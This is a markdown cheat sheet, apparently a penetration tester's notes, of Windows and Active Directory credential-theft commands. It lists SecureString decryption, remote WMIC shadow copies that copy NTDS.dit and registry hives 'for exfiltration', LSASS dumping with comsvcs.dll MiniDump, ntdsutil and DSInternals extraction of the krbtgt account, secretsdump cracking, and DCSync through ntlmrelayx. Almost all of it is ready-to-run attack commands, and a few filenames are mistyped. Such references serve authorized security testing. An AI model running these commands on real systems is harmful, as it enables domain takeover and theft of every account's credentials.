# Credential Access

### SecureString to Plaintext

```powershell
$SecPass = "<SECURE PASS STRING>" | ConvertTo-SecureString; 
(New-Object System.Management.Automation.PSCredential "N/A", $SecPass).GetNetworkCredential().Password; 
```
### Passwords in Description
`ActiveDirectory` Module

```powershell
Get-ADUser -Filter 'Description -like "*password*"' -Properties Description | select name,Description
```
Using `PowerView.ps1`
GitHub: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
```powershell
Find-UserField -SearchField Description -SearchTerm "password"
```
### Volume Shadow Creation
Source: [https://www.picussecurity.com/resource/blog/t1047-windows-management-instrumentation-of-the-mitre-attack-framework](https://www.picussecurity.com/resource/blog/t1047-windows-management-instrumentation-of-the-mitre-attack-framework)
```powershell
# creating volume shadow copy
wmic /node:"[AD_IP_address]" /user:"[username]" /password:"[password]" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"

# copying NTDS.dit, SYSTEM and SECURITY files from shadow copy
wmic /node:"[AD_IP_address]" /user:"[username]" /password:"[password]" process call create "cmd /c copy \\[shadow_copy_dir]\\Windows\\NTDS\\NTDS.dit [target_folder] & copy \\[shadow_copy_dir]\\Windows\\System32\\config\\SYSTEM [target_folder] & copy \\[shadow_copy_dir]\\Windows\\System32\\config\\SECURITY [target_folder]"

# compressing files for exfiltration
7za.exe a -mx3 nt.7z \\\\[AD_IP_address]\\c$\\[target_folder]
```
### Dumping LSASS with \`rundll32.exe\`
Same behavior that would occur if you `Right-Clicked` the process in Task Manager and dump LSASS manually.
```powershell
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```
### Memory Dump with `Get-StorageDiagnosticInfo`
Source: [https://x.com/0gtweet/status/1440255495797764108](https://x.com/0gtweet/status/1440255495797764108)
https://docs.microsoft.com/en-us/powershell/module/storage/get-storagediagnosticinfo?view=windowsserver2019-ps
```powershell
$fname = Get-StorageSubSystem | Select -Property FriendlyName
Get-StorageDiagnosticInfo -StorageSubSystemFriendlyName $fname -IncludeLiveDump -DestinationPath C:\
```
### Dumping NTDS with `ntdsutil.exe`
```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```
### Extracting from NTDS, SYSTEM, SECURITY
You may have to modify the following registry key:
* `HKLM\\System\\CurrentControlSet\\Control\\Lsa\\FipsAlgorithmPolicy and set "Enabled" to 0`
```powershell
Install-Module DSInternals; Import-Module DSInternals;

$key = Get-BootKey -SystemHivePath '.\registry\SYSTEM';
Get-ADDBAccount -DistinguishedName 'CN=krbtgt,CN=Users,DC=burmat,DC=local' -DBPath '.\Active Directory\ntds.dit' -BootKey $key;
```
## SECRETSDUMP
### Extracting NTDS with `ntdsutil.exe`
```powershell
C:\> ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit
```
### Offline NTDS Cracking
```sh
secretsdump.py -ntds ./active directory/atds.dit -system SYSTEM LOCAL -output secrets_dump.ntds -user-status
```
Remove all of the garbage/disabled accounts:
```sh
grep -i "Enabled" secretsdump.ntds | awk -F":::" '{print $1":::"}'| grep -v '$:\\|$DUPLICATE\\|IWAM_\\|IUSR_\\|ASPNET\\|HelpAssistant\\|SUPPORT_\\|Guest\\|DefaultAccount\\|HealthMailbox' >> Enabled_Accounts.txt
```
### DCSync
```sh
ntlmrelayx.py -t DCSYNC://172.16.1.200 -smb2support -debug
python3 dementor.py -d burmat.local -u jsmith -p 'S3cur3PASS123$' 10.10.1.141 172.16.1.23 -debug
```